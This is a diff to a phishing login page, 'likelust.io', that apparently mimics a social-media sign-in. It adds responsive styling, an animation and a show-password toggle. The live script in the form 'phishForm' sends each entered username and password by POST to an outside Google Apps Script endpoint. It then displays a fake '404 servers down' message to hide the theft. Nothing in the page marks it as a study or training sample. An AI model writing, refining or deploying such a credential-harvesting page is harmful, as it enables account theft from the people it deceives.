@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>likelust.io</title>
   <style>
     body {
@@ -10,15 +11,24 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      height: 100vh;
+      min-height: 100vh;
       margin: 0;
+      padding: 20px;
     }
     .login-box {
       background: white;
       border: 1px solid #dbdbdb;
-      padding: 40px;
-      width: 300px;
+      padding: 40px 20px;
+      width: 100%;
+      max-width: 350px;
       text-align: center;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      border-radius: 8px;
+      animation: fadeIn 1s ease-in-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
     }
     .fake-url {
       font-size: 0.8em;
@@ -27,19 +37,31 @@
     }
     input, button {
       width: 100%;
-      padding: 10px;
-      margin: 8px 0;
+      padding: 12px;
+      margin: 10px 0;
       border: 1px solid #dbdbdb;
-      border-radius: 3px;
+      border-radius: 4px;
+      font-size: 16px;
     }
     button {
       background: #3897f0;
       color: white;
       cursor: pointer;
+      font-weight: bold;
     }
     img {
-      width: 180px;
+      width: 175px;
       margin-bottom: 20px;
+    }
+    .toggle-password {
+      text-align: right;
+      margin-top: -8px;
+      font-size: 0.9em;
+      cursor: pointer;
+      color: #00376b;
+    }
+    .toggle-password:hover {
+      text-decoration: underline;
     }
     .error-screen {
       text-align: center;
@@ -53,6 +75,11 @@
     .error-screen p {
       color: #888;
     }
+    @media (max-width: 400px) {
+      input, button {
+        font-size: 14px;
+      }
+    }
   </style>
 </head>
 <body>
@@ -62,14 +89,15 @@
     <form id="phishForm">
       <input type="text" id="username" name="username" autocomplete="username" placeholder="Phone number, username, or email" required>
       <input type="password" id="password" name="password" autocomplete="current-password" placeholder="Password" required>
+      <div class="toggle-password" onclick="togglePassword()">Show Password</div>
       <button type="submit">Log In</button>
     </form>
   </div>
 
   <div class="error-screen" id="errorScreen" style="display:none;">
-  <h1>404</h1>
-  <p>LikeLust Servers are Currently Down. Please try again later.</p>
-</div>
+    <h1>404</h1>
+    <p>LikeLust Servers are Currently Down. Please try again later.</p>
+  </div>
 
   <script>
     const scriptURL = 'https://script.google.com/macros/s/AKfycbxeeRW76Vn8MfC_DgnfMxxvuGaJyQzmVgeFofR6nCu5wSknftS59ztgCnvHm12MYmjW/exec';
@@ -84,17 +112,28 @@
 
       fetch(scriptURL, {
         method: 'POST',
-        mode: 'no-cors', // Bypass CORS issues
+        mode: 'no-cors',
         headers: {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify(data)
       });
 
-      // Simulate "too many requests" error page
       document.getElementById('loginBox').style.display = 'none';
       document.getElementById('errorScreen').style.display = 'block';
     });
+
+    function togglePassword() {
+      const pwd = document.getElementById('password');
+      const toggle = document.querySelector('.toggle-password');
+      if (pwd.type === 'password') {
+        pwd.type = 'text';
+        toggle.textContent = 'Hide Password';
+      } else {
+        pwd.type = 'password';
+        toggle.textContent = 'Show Password';
+      }
+    }
   </script>
 </body>
 </html>
